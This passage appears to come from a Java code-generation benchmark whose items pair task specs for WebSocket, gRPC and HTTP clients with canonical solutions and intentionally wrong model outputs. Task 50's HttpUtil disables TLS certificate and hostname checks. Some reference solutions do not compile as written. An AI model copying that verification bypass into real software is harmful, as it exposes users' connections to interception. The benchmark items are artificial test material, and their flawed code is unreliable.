    "Canonical_solution": "import java.io.IOException;\nimport javax.websocket.EncodeException;\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/chat\")\npublic class ChatEndpoint {\n    @OnMessage\n    public void message(String message, Session client) throws IOException, EncodeException {\n        System.out.println(\"message: \" + message);\n        for (Session peer : client.getOpenSessions()) {\n            peer.getBasicRemote().sendText(message);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "@ServerEndpoint(\"/chat\")\npublic class ChatEndpoint {\n\n    private static List<Session> sessions = new ArrayList<>();\n\n    @OnOpen\n    public void onOpen(Session session) {\n        sessions.add(session);\n    }\n\n    @OnClose\n    public void onClose(Session session) {\n        sessions.remove(session);\n    }\n\n    @OnMessage\n    public void message(String message, Session client) throws IOException, EncodeException {\n        for (Session session : sessions) {\n            session.getBasicRemote().sendText(message);\n        }\n    }\n}"
  },
  {
    "Task_id": 495,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that echoes received text messages back to the client asynchronously.\n\nClass Description: This class represents a WebSocket server endpoint that handles text-based communication with clients. It listens for incoming text messages and echoes them back to the sender using asynchronous communication.\n\nAttributes: None\n\nMethods:\n- echoText: [String text, Session session] -> void - Handles incoming text messages from clients. Takes the received text and the client session as input, then sends the same text back to the client asynchronously using the session's async remote endpoint.",
    "Canonical_solution": "import javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/text\")\npublic class MyAsyncEndpointText {\n\n    @OnMessage\n    public void echoText(String text, Session session) {\n        session.getAsyncRemote().sendText(text);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "import javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.Endpoint;\n\npublic class EchoWebSocketEndpoint extends Endpoint {\n    @OnMessage\n    public void echoText(String text, Session session) {\n        session.getAsyncRemote().sendText(text);\n    }\n}"
  },
  {
    "Task_id": 496,
    "Instruction": "Task Description: Create a gRPC client class in Java that checks the health of a gRPC server using the gRPC Health Checking Protocol.\n\nClass Description: The GrpcHealthClient class establishes a connection to a gRPC server and provides functionality to check the server's health status. It manages the gRPC channel and stub for communication with the server.\n\nAttributes:\n- channel: [ManagedChannel] - The gRPC communication channel to the server\n- stub: [HealthStub] - The asynchronous gRPC stub for health check operations\n\nMethods:\n- GrpcHealthClient(String host, int port) -> [void] - Constructor that initializes the gRPC channel and stub with the specified server host and port\n- checkHealth() -> [HealthCheckResponse] - Sends a health check request to the server and returns the response\n- shutdown() -> [void] - Shuts down the gRPC channel gracefully",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.health.v1.HealthCheckRequest;\nimport io.grpc.health.v1.HealthCheckResponse;\nimport io.grpc.health.v1.HealthGrpc;\nimport io.grpc.health.v1.HealthGrpc.HealthStub;\n\npublic class GrpcHealthClient {\n\n    private final ManagedChannel channel;\n    private final HealthStub stub;\n\n    public GrpcHealthClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port)\n                .usePlaintext()\n                .build();\n        this.stub = HealthGrpc.newStub(channel);\n    }\n\n    public HealthCheckResponse checkHealth() {\n        HealthCheckRequest request = HealthCheckRequest.getDefaultInstance();\n        AwaitableStreamObserver<HealthCheckResponse> responseObserver = new AwaitableStreamObserver<>();\n        stub.check(request, responseObserver);\n        return responseObserver.getSingle();\n    }\n\n    public void shutdown() {\n        channel.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "wrong_result": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.healthcheck.HealthCheckRequest;\nimport io.grpc.healthcheck.HealthCheckResponse;\nimport io.grpc.healthcheck.HealthStub;\nimport java.util.concurrent.TimeUnit;\n\npublic class GrpcHealthClient {\n    private final ManagedChannel channel;\n    private final HealthStub stub;\n\n    public GrpcHealthClient(String host, int port) {\n        channel = ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();\n        stub = HealthStub.newInstance(channel);\n    }\n\n    public HealthCheckResponse checkHealth() {\n        HealthCheckRequest request = HealthCheckRequest.newBuilder().setService(\"example-service\").build();\n        return stub.check(request);\n    }\n\n    public void shutdown() {\n        channel.shutdown();\n        try {\n            if (!channel.awaitTermination(1, TimeUnit.MINUTES)) {\n                channel.shutdownNow();\n            }\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n}"
  },
  {
    "Task_id": 498,
    "Instruction": "Task Description: Create a gRPC client class for service discovery that handles connection management, stub creation, and remote method invocation with retry logic.\n\nClass Description: DiscoveryClient is a gRPC client implementation that manages connections to a discovery service, provides thread-safe operations, and includes automatic retry mechanisms for failed requests.\n\nAttributes:\n- requireResetStub: AtomicBoolean - Flag indicating whether the stub needs to be reset\n- channel: ManagedChannel - The gRPC communication channel\n- registerStub: DiscoveryServiceBlockingStub - Blocking stub for registration operations  \n- blockingStub: DiscoveryServiceBlockingStub - Blocking stub for general operations\n- readWriteLock: ReentrantReadWriteLock - Lock for thread-safe operations\n- pdAddresses: List<String> - Server addresses (implied from usage)\n\nMethods:\n- DiscoveryClient(String centerAddress) -> None - Constructor that initializes the client with target server address\n- getNodeInfos(Query query) -> NodeInfos - Retrieves node information from discovery service with retry logic\n- tryWithTimes(Function<V,R> function, V v) -> R - Helper method implementing retry logic for operations\n- resetStub() -> None - Resets the channel and stubs when connection issues occur  \n- resetChannel(String address) -> None - Recreates the channel and stubs with a new address\n- close() -> None - Shuts down the channel and cleans up resources\n\nThe class demonstrates proper gRPC client patterns including:\n1. Channel lifecycle management\n2. Thread-safe stub operations\n3. Connection retry mechanisms\n4. Resource cleanup\n5. Error handling for network operations",
    "Canonical_solution": "import org.apache.hugegraph.pd.grpc.discovery.DiscoveryServiceGrpc;\nimport org.apache.hugegraph.pd.grpc.discovery.NodeInfos;\nimport org.apache.hugegraph.pd.grpc.discovery.Query;\nimport org.apache.hugegraph.pd.grpc.discovery.RegisterInfo;\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\nimport java.util.function.Function;\n\npublic class DiscoveryClient {\n\n    private final AtomicBoolean requireResetStub = new AtomicBoolean(false);\n    private ManagedChannel channel = null;\n    private DiscoveryServiceGrpc.DiscoveryServiceBlockingStub registerStub;\n    private DiscoveryServiceGrpc.DiscoveryServiceBlockingStub blockingStub;\n    private ReentrantReadWriteLock readWriteLock = new ReentrantReadWriteLock();\n\n    public DiscoveryClient(String centerAddress) {\n        resetChannel(centerAddress);\n    }\n\n    public NodeInfos getNodeInfos(Query query) {\n        return tryWithTimes((q) -> {\n            this.readWriteLock.readLock().lock();\n            NodeInfos nodes;\n            try {\n                nodes = this.blockingStub.getNodes(q);\n            } finally {\n                this.readWriteLock.readLock().unlock();\n            }\n            return nodes;\n        }, query);\n    }\n\n    private <V, R> R tryWithTimes(Function<V, R> function, V v) {\n        R r;\n        Exception ex = null;\n        for (int i = 0; i < 3; i++) {\n            try {\n                r = function.apply(v);\n                return r;\n            } catch (Exception e) {\n                requireResetStub.set(true);\n                resetStub();\n                ex = e;\n            }\n        }\n        if (ex != null) {\n            throw new RuntimeException(\"Discovery method failed\", ex);\n        }\n        return null;\n    }\n\n    private void resetStub() {\n        if (requireResetStub.get()) {\n            try {\n                resetChannel(pdAddresses.get(0));\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to reset stub\", e);\n            }\n        }\n    }\n\n    private void resetChannel(String address) {\n        readWriteLock.writeLock().lock();\n        try {\n            if (requireResetStub.get()) {\n                if (channel != null) {\n                    channel.shutdownNow();\n                    channel.awaitTermination(100, TimeUnit.MILLISECONDS);\n                }\n                channel = ManagedChannelBuilder.forTarget(address)\n                        .usePlaintext().build();\n                this.registerStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n                this.blockingStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n                requireResetStub.set(false);\n            }\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to reset channel\", e);\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n\n    public void close() {\n        readWriteLock.writeLock().lock();\n        try {\n            if (channel != null) {\n                channel.shutdownNow();\n                channel.awaitTermination(100, TimeUnit.MILLISECONDS);\n            }\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to close channel\", e);\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "wrong_result": "public class DiscoveryClient {\n    private final AtomicBoolean requireResetStub = new AtomicBoolean(false);\n    private ManagedChannel channel;\n    private DiscoveryServiceBlockingStub registerStub;\n    private DiscoveryServiceBlockingStub blockingStub;\n    private final ReentrantReadWriteLock readWriteLock = new ReentrantReadWriteLock();\n    private final List<String> pdAddresses;\n\n    public DiscoveryClient(String centerAddress) {\n        this.pdAddresses = List.of(centerAddress);\n        this.channel = ManagedChannelBuilder.forAddress(centerAddress, 50051)\n                .usePlaintext()\n                .build();\n        this.registerStub = DiscoveryServiceBlockingStub.newInstance(channel);\n        this.blockingStub = DiscoveryServiceBlockingStub.newInstance(channel);\n    }\n\n    public NodeInfos getNodeInfos(Query query) {\n        return tryWithTimes((Query q) -> blockingStub.getNodeInfos(q), query);\n    }\n\n    private <V, R> R tryWithTimes(Function<V, R> function, V v) {\n        int maxRetries = 3;\n        for (int i = 0; i < maxRetries; i++) {\n            try {\n                return function.apply(v);\n            } catch (Exception e) {\n                if (i == maxRetries - 1) {\n                    throw new RuntimeException(\"Failed after \" + maxRetries + \" retries\", e);\n                }\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException ie) {\n                    Thread.currentThread().interrupt();\n                    throw new RuntimeException(\"Interrupted during retry\", ie);\n                }\n            }\n        }\n        return null;\n    }\n\n    private void resetStub() {\n        readWriteLock.writeLock().lock();\n        try {\n            if (requireResetStub.getAndSet(false)) {\n                resetChannel(pdAddresses.get(0));\n            }\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n\n    private void resetChannel(String address) {\n        readWriteLock.writeLock().lock();\n        try {\n            if (channel != null) {\n                channel.shutdownNow();\n            }\n            channel = ManagedChannelBuilder.forAddress(address, 50051)\n                    .usePlaintext()\n                    .build();\n            registerStub = DiscoveryServiceBlockingStub.newInstance(channel);\n            blockingStub = DiscoveryServiceBlockingStub.newInstance(channel);\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n\n    public void close() {\n        readWriteLock.writeLock().lock();\n        try {\n            if (channel != null) {\n                channel.shutdownNow();\n            }\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n}"
  },
  {
    "Task_id": 499,
    "Instruction": "Task Description: Create a gRPC client class in Java that connects to a gRPC server for executing GraphQL queries and handling responses asynchronously.\n\nClass Description: The GraphQlGrpcClient class establishes a connection to a gRPC server, provides functionality to execute GraphQL queries, and handles server responses asynchronously. It manages the gRPC channel lifecycle and provides cleanup methods.\n\nAttributes:\n- channel: [ManagedChannel] - The gRPC communication channel to the server\n- stub: [GraphQlServiceGrpc.GraphQlServiceStub] - The asynchronous gRPC stub for making service calls\n- ON_COMPLETE: [CountDownLatch] - Synchronization aid to wait for response completion\n- logger: [Logger] - Logger instance for logging client activities\n\nMethods:\n- GraphQlGrpcClient(String host, int port) -> [Constructor] - Creates a client instance with specified host and port, using plaintext connection\n- GraphQlGrpcClient(ManagedChannel channel) -> [Constructor] - Creates a client instance with an existing channel\n- shutdown() -> [void] - Shuts down the channel gracefully with a 5-second timeout\n- query(String query) -> [void] - Executes a GraphQL query asynchronously and logs responses/errors",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.examples.graphql.GraphQlRequest;\nimport io.grpc.examples.graphql.GraphQlResponse;\nimport io.grpc.examples.graphql.GraphQlServiceGrpc;\nimport io.grpc.stub.StreamObserver;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class GraphQlGrpcClient {\n  private static final Logger logger = Logger.getLogger(GraphQlGrpcClient.class.getName());\n\n  private final ManagedChannel channel;\n  private final GraphQlServiceGrpc.GraphQlServiceStub stub;\n  private final CountDownLatch ON_COMPLETE = new CountDownLatch(1);\n\n  public GraphQlGrpcClient(String host, int port) {\n    this(ManagedChannelBuilder.forAddress(host, port).usePlaintext().build());\n  }\n\n  GraphQlGrpcClient(ManagedChannel channel) {\n    this.channel = channel;\n    stub = GraphQlServiceGrpc.newStub(channel);\n  }\n\n  public void shutdown() throws InterruptedException {\n    channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n  }\n\n  public void query(String query) {\n    GraphQlRequest request =\n        GraphQlRequest.newBuilder().build().newBuilder().setQuery(query).build();\n\n    stub.execute(\n        request,\n        new StreamObserver<GraphQlResponse>() {\n          @Override\n          public void onNext(GraphQlResponse value) {\n            logger.info(\"onNext: \" + value);\n          }\n\n          @Override\n          public void onError(Throwable t) {\n            logger.log(Level.WARNING, t, () -> \"onError\");\n            ON_COMPLETE.countDown();\n          }\n\n          @Override\n          public void onCompleted() {\n            logger.info(\"onCompleted\");\n            ON_COMPLETE.countDown();\n          }\n        });\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "wrong_result": "public class GraphQlGrpcClient {\n    private final ManagedChannel channel;\n    private final GraphQlServiceGrpc.GraphQlServiceStub stub;\n    private final CountDownLatch on_complete;\n    private final Logger logger;\n\n    public GraphQlGrpcClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port)\n                .usePlaintext()\n                .build();\n        this.stub = GraphQlServiceGrpc.newAsyncStub(channel);\n        this.on_complete = new CountDownLatch(1);\n        this.logger = LoggerFactory.getLogger(GraphQlGrpcClient.class);\n    }\n\n    public GraphQlGrpcClient(ManagedChannel channel) {\n        this.channel = channel;\n        this.stub = GraphQlServiceGrpc.newAsyncStub(channel);\n        this.on_complete = new CountDownLatch(1);\n        this.logger = LoggerFactory.getLogger(GraphQlGrpcClient.class);\n    }\n\n    public void shutdown() {\n        channel.shutdownNow();\n        try {\n            if (!channel.awaitTermination(5, TimeUnit.SECONDS)) {\n                channel.shutdown();\n            }\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void query(String query) {\n        AsyncUnaryCall<QueryResponse, QueryRequest> call = stub.executeQuery(ExecuteQueryRequest.newBuilder().setQuery(query).build());\n\n        call.whenDone(response -> {\n            logger.info(\"Received response: \" + response);\n            on_complete.countDown();\n        }).whenExceptionally(exception -> {\n            logger.error(\"Error in query: \", exception);\n            on_complete.countDown();\n        });\n    }\n}"
  },
  {
    "Task_id": 50,
    "Instruction": "Task Description: Create a Java utility class for making HTTP/HTTPS requests with support for custom timeouts, request methods, content types, and handling of both successful and error responses.\n\nClass Description: HttpUtil is a utility class that provides methods for making HTTP/HTTPS requests. It handles both secure (HTTPS) and non-secure (HTTP) connections, supports various request methods (GET, POST, etc.), and includes proper error handling and resource cleanup.\n\nAttributes:\n- Timeout: [int] - Default timeout value for connections (5000ms)\n- DefalutEncoding: [String] - Default character encoding for requests/responses (\"UTF-8\")\n- currentProxy: [Map] - Storage for proxy configuration (currently unused in the reference implementation)\n- allHostsValid: [HostnameVerifier] - Custom hostname verifier that accepts all HTTPS hosts\n\nMethods:\n- httpRequest: [httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding)] -> [String] - Makes an HTTP/HTTPS request with specified parameters and returns the response as a string\n- readString: [readString(InputStream inputStream, String encoding)] -> [String] - Helper method to read an InputStream into a String with specified encoding\n- X509TrustUtiil: [Nested class implementing X509TrustManager] - Custom trust manager that accepts all certificates for HTTPS connections\n\nThe class handles:\n1. Both HTTP and HTTPS connections\n2. Custom timeouts for connect and read operations\n3. Various request methods (GET, POST, etc.)\n4. Request headers (particularly Content-Type)\n5. Request body for POST requests\n6. Proper error stream handling\n7. Resource cleanup (connection closing, stream closing)\n8. SSL certificate verification bypass for HTTPS\n9. Character encoding for requests and responses",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.security.SecureRandom;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.HashMap;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSession;\nimport javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\n\npublic class HttpUtil {\n    private static final int Timeout = 5000;\n    private static final String DefalutEncoding = \"UTF-8\";\n    private static Map currentProxy = new HashMap();\n    public static HostnameVerifier allHostsValid = new HostnameVerifier() {\n        @Override\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    };\n\n    public static String httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding) throws Exception {\n        if (\"\".equals(encoding) || encoding == null) {\n            encoding = DefalutEncoding;\n        }\n\n        URLConnection httpUrlConn = null;\n        HttpsURLConnection hsc = null;\n        HttpURLConnection hc = null;\n        InputStream inputStream = null;\n\n        String result;\n        try {\n            URL url = new URL(requestUrl);\n            if (requestUrl.startsWith(\"https\")) {\n                SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n                TrustManager[] tm = new TrustManager[]{new X509TrustUtiil()};\n                sslContext.init(null, tm, new SecureRandom());\n                SSLSocketFactory ssf = sslContext.getSocketFactory();\n                hsc = (HttpsURLConnection) url.openConnection();\n                hsc.setSSLSocketFactory(ssf);\n                hsc.setHostnameVerifier(allHostsValid);\n                httpUrlConn = hsc;\n            } else {\n                hc = (HttpURLConnection) url.openConnection();\n                hc.setRequestMethod(requestMethod);\n                hc.setInstanceFollowRedirects(false);\n                httpUrlConn = hc;\n            }\n\n            httpUrlConn.setConnectTimeout(timeOut);\n            httpUrlConn.setReadTimeout(timeOut);\n            if (contentType != null && !\"\".equals(contentType)) {\n                httpUrlConn.setRequestProperty(\"Content-Type\", contentType);\n            }\n\n            httpUrlConn.setDoOutput(true);\n            httpUrlConn.setDoInput(true);\n            httpUrlConn.connect();\n            if (null != postString && !\"\".equals(postString)) {\n                OutputStream outputStream = httpUrlConn.getOutputStream();\n                outputStream.write(postString.getBytes(encoding));\n                outputStream.flush();\n                outputStream.close();\n            }\n\n            inputStream = httpUrlConn.getInputStream();\n            result = readString(inputStream, encoding);\n            return result;\n        } catch (IOException var18) {\n            if (hsc == null) {\n                if (hc != null) {\n                    result = readString(hc.getErrorStream(), encoding);\n                    return result;\n                }\n                result = \"\";\n                return result;\n            }\n            result = readString(hsc.getErrorStream(), encoding);\n        } finally {\n            if (hsc != null) {\n                hsc.disconnect();\n            }\n            if (hc != null) {\n                hc.disconnect();\n            }\n        }\n        return result;\n    }\n\n    public static String readString(InputStream inputStream, String encoding) throws IOException {\n        BufferedInputStream bis = null;\n        ByteArrayOutputStream baos = null;\n\n        try {\n            bis = new BufferedInputStream(inputStream);\n            baos = new ByteArrayOutputStream();\n            byte[] arr = new byte[1];\n\n            int len;\n            while ((len = bis.read(arr)) != -1) {\n                baos.write(arr, 0, len);\n            }\n        } finally {\n            if (baos != null) {\n                baos.flush();\n                baos.close();\n            }\n            if (bis != null) {\n                bis.close();\n            }\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            return baos.toString(encoding);\n        }\n    }\n\n    static class X509TrustUtiil implements X509TrustManager {\n        @Override\n        public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {\n        }\n\n        @Override\n        public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {\n        }\n\n        @Override\n        public X509Certificate[] getAcceptedIssuers() {\n            return null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpUtil {\n    private int timeout = 5000;\n    private String defaultEncoding = \"UTF-8\";\n    private Map<String, String> currentProxy;\n    private HostnameVerifier allHostsValid = new HostnameVerifier() {\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    };\n\n    public static class X509TrustUtiil implements X509TrustManager {\n        public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n        public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n    }\n\n    public String httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding) throws Exception {\n        URL url = new URL(requestUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setConnectTimeout(timeOut);\n        connection.setReadTimeout(timeOut);\n        connection.setRequestMethod(requestMethod);\n\n        if (url.getProtocol().equals(\"https\")) {\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, new TrustManager[]{new X509TrustUtiil()}, null);\n            connection.setSSLSocketFactory(sslContext.getSocketFactory());\n            connection.setHostnameVerifier(allHostsValid);\n        }\n\n        if (\"POST\".equalsIgnoreCase(requestMethod)) {\n            connection.setRequestProperty(\"Content-Type\", contentType);\n            try (OutputStream os = connection.getOutputStream()) {\n                os.write(postString.getBytes(encoding));\n            }\n        }\n\n        int responseCode = connection.getResponseCode();\n        String response = \"\";\n        if (responseCode != 200) {\n            InputStream errorStream = connection.getErrorStream();\n            if (errorStream != null) {\n                response = readString(errorStream, encoding);\n            }\n        } else {\n            InputStream inputStream = connection.getInputStream();\n            response = readString(inputStream, encoding);\n        }\n\n        connection.disconnect();\n        return response;\n    }\n\n    private String readString(InputStream inputStream, String encoding) throws IOException {\n        if (inputStream == null) {\n            return \"\";\n        }\n        StringBuilder sb = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, encoding))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line);\n            }\n        }\n        return sb.toString();\n    }\n}"
  },
  {
    "Task_id": 502,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for interacting with a PD (Placement Driver) server, supporting both blocking and asynchronous communication patterns, with connection management and error handling capabilities.\n\nClass Description: AbstractClient is an abstract base class that provides core gRPC client functionality for PD server communication. It manages channel connections, creates stubs, implements retry logic, and handles connection failures. The class is designed to be extended by concrete implementations that provide specific stub creation methods.\n\nAttributes:\n- chs: ConcurrentHashMap<String, ManagedChannel> - Shared map of managed channels by host\n- stubProxy: AbstractClientStubProxy - Proxy for managing stub instances\n- config: PDConfig - Configuration object containing server hosts and timeout settings\n- channel: ManagedChannel - Current active channel connection\n- stubs: ConcurrentMap<String, AbstractBlockingStub> - Map of blocking stubs by address\n\nMethods:\n- AbstractClient(PDConfig config) -> void - Constructor that initializes the client with configuration\n- getBlockingStub() -> AbstractBlockingStub - Gets or creates a blocking stub instance\n- getStub() -> AbstractStub - Gets or creates an async stub instance\n- createStub() -> AbstractStub - Abstract method to be implemented for creating async stubs\n- createBlockingStub() -> AbstractBlockingStub - Abstract method to be implemented for creating blocking stubs\n- resetStub() -> String - Resets the connection and finds the current leader host\n- blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req) -> RespT - Makes a blocking unary RPC call with default retries\n- blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, int retry) -> RespT - Makes a blocking unary RPC call with specified retries\n- concurrentBlockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, Predicate<RespT> predicate) -> KVPair<Boolean, RespT> - Makes concurrent calls to multiple hosts\n- streamingCall(MethodDescriptor<ReqT, RespT> method, ReqT request, StreamObserver<RespT> responseObserver, int retry) -> void - Makes a server streaming call\n- close() -> void - Closes all active channels and cleans up resources\n- closeChannel(ManagedChannel channel) -> void - Helper method to safely close a channel",
    "Canonical_solution": "import java.io.Closeable;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Predicate;\nimport java.util.stream.Stream;\n\nimport org.apache.hugegraph.pd.common.KVPair;\nimport org.apache.hugegraph.pd.common.PDException;\nimport org.apache.hugegraph.pd.grpc.PDGrpc;\nimport org.apache.hugegraph.pd.grpc.PDGrpc.PDBlockingStub;\nimport org.apache.hugegraph.pd.grpc.Pdpb;\n\nimport io.grpc.Channel;\nimport io.grpc.ClientCall;\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.MethodDescriptor;\nimport io.grpc.StatusRuntimeException;\nimport io.grpc.stub.AbstractBlockingStub;\nimport io.grpc.stub.AbstractStub;\nimport io.grpc.stub.ClientCalls;\nimport io.grpc.stub.StreamObserver;\nimport lombok.extern.slf4j.Slf4j;\n\n@Slf4j\npublic abstract class AbstractClient implements Closeable {\n\n    private static final ConcurrentHashMap<String, ManagedChannel> chs = new ConcurrentHashMap<>();\n    protected final AbstractClientStubProxy stubProxy;\n    protected final PDConfig config;\n    protected ManagedChannel channel = null;\n    protected volatile ConcurrentMap<String, AbstractBlockingStub> stubs = null;\n\n    protected AbstractClient(PDConfig config) {\n        String[] hosts = config.getServerHost().split(\",\");\n        this.stubProxy = new AbstractClientStubProxy(hosts);\n        this.config = config;\n    }\n\n    protected AbstractBlockingStub getBlockingStub() throws PDException {\n        if (stubProxy.getBlockingStub() == null) {\n            synchronized (this) {\n                if (stubProxy.getBlockingStub() == null) {\n                    String host = resetStub();\n                    if (host.isEmpty()) {\n                        throw new PDException(Pdpb.ErrorType.PD_UNREACHABLE_VALUE,\n                                              \"PD unreachable, pd.peers=\" +\n                                              config.getServerHost());\n                    }\n                }\n            }\n        }\n        return (AbstractBlockingStub) stubProxy.getBlockingStub()\n                                               .withDeadlineAfter(config.getGrpcTimeOut(),\n                                                                  TimeUnit.MILLISECONDS);\n    }\n\n    protected AbstractStub getStub() throws PDException {\n        if (stubProxy.getStub() == null) {\n            synchronized (this) {\n                if (stubProxy.getStub() == null) {\n                    String host = resetStub();\n                    if (host.isEmpty()) {\n                        throw new PDException(Pdpb.ErrorType.PD_UNREACHABLE_VALUE,\n                                              \"PD unreachable, pd.peers=\" +\n                                              config.getServerHost());\n                    }\n                }\n            }\n        }\n        return stubProxy.getStub();\n    }\n\n    protected abstract AbstractStub createStub();\n\n    protected abstract AbstractBlockingStub createBlockingStub();\n\n    private String resetStub() {\n        String leaderHost = \"\";\n        for (int i = 0; i < stubProxy.getHostCount(); i++) {\n            String host = stubProxy.nextHost();\n            channel = ManagedChannelBuilder.forTarget(host).usePlaintext().build();\n            PDBlockingStub blockingStub = PDGrpc.newBlockingStub(channel)\n                                                .withDeadlineAfter(config.getGrpcTimeOut(),\n                                                                   TimeUnit.MILLISECONDS);\n            try {\n                GetMembersRequest request = Pdpb.GetMembersRequest.newBuilder()\n                                                                  .setHeader(header).build();\n                GetMembersResponse members = blockingStub.getMembers(request);\n                Metapb.Member leader = members.getLeader();\n                leaderHost = leader.getGrpcUrl();\n                close();\n                channel = ManagedChannelBuilder.forTarget(leaderHost).usePlaintext().build();\n                stubProxy.setBlockingStub(createBlockingStub());\n                stubProxy.setStub(createStub());\n                log.info(\"PDClient connect to host = {} success\", leaderHost);\n                break;\n            } catch (Exception e) {\n                log.error(\"PDClient connect to {} exception {}, {}\", host, e.getMessage(),\n                          e.getCause() != null ? e.getCause().getMessage() : \"\");\n            }\n        }\n        return leaderHost;\n    }\n\n    protected <ReqT, RespT, StubT extends AbstractBlockingStub<StubT>> RespT blockingUnaryCall(\n            MethodDescriptor<ReqT, RespT> method, ReqT req) throws PDException {\n        return blockingUnaryCall(method, req, 5);\n    }\n\n    protected <ReqT, RespT, StubT extends AbstractBlockingStub<StubT>> RespT blockingUnaryCall(\n            MethodDescriptor<ReqT, RespT> method, ReqT req, int retry) throws PDException {\n        AbstractBlockingStub stub = getBlockingStub();\n        try {\n            RespT resp =\n                    ClientCalls.blockingUnaryCall(stub.getChannel(), method, stub.getCallOptions(),\n                                                  req);\n            return resp;\n        } catch (Exception e) {\n            log.error(method.getFullMethodName() + \" exception, {}\", e.getMessage());\n            if (e instanceof StatusRuntimeException) {\n                if (retry < stubProxy.getHostCount()) {\n                    synchronized (this) {\n                        stubProxy.setBlockingStub(null);\n                    }\n                    return blockingUnaryCall(method, req, ++retry);\n                }\n            }\n        }\n        return null;\n    }\n\n    protected <ReqT, RespT> KVPair<Boolean, RespT> concurrentBlockingUnaryCall(\n            MethodDescriptor<ReqT, RespT> method, ReqT req, Predicate<RespT> predicate) {\n        LinkedList<String> hostList = this.stubProxy.getHostList();\n        if (this.stubs == null) {\n            synchronized (this) {\n                if (this.stubs == null) {\n                    this.stubs = new ConcurrentHashMap<>(hostList.size());\n                }\n            }\n        }\n        Stream<RespT> respTStream = hostList.parallelStream().map((address) -> {\n            AbstractBlockingStub stub = getConcurrentBlockingStub(address);\n            RespT resp = ClientCalls.blockingUnaryCall(stub.getChannel(),\n                                                       method, stub.getCallOptions(), req);\n            return resp;\n        });\n        KVPair<Boolean, RespT> pair;\n        AtomicReference<RespT> response = new AtomicReference<>();\n        boolean result = respTStream.anyMatch((r) -> {\n            response.set(r);\n            return predicate.test(r);\n        });\n        if (result) {\n            pair = new KVPair<>(true, null);\n        } else {\n            